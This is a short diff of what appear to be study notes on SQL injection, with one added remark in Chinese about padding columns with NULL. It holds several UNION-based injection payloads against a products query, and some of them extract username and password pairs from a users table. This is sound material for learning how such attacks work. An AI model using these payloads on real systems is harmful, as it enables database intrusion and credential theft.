@@ -62,3 +62,7 @@ SELECT id, name FROM products WHERE category = 'Gifts`' UNION SELECT NULL,'a'--`
 
 SELECT name FROM products WHERE category = 'Gifts`' UNION SELECT username || '~' || password FROM users--`'
 
+多个列需要用NULL占位
+
+SELECT id, name FROM products WHERE category = 'Gifts`' UNION SELECT NULL, username || '~' || password FROM users--`'
+
